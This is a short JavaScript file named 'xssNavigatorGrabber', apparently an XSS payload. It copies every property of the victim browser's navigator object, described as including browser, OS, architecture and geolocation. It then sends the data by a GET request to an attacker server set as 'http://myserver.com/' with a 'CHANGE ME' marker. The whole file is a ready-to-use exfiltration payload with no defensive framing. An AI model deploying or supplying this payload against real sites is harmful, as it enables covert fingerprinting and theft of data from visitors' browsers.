/**
 *  xssNavigatorGrabber
 * 
 *  A function that retrieves window.navigator object and sends it  to the provided URL.
 *  window.navigator inclused some interesting things including the browser, OS, 
 *  architecture, geolocation and other interesting things.
 * 
 */
// Set up variables
var url = 'http://myserver.com/'; // CHANGE ME

// Serialise the navigator object
var _navigator = {};
for (var i in navigator) _navigator[i] = navigator[i];
var payload = '?navigator=' + JSON.stringify(_navigator);

// Construct and send the request
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", url + payload, true);
xmlHttp.send();
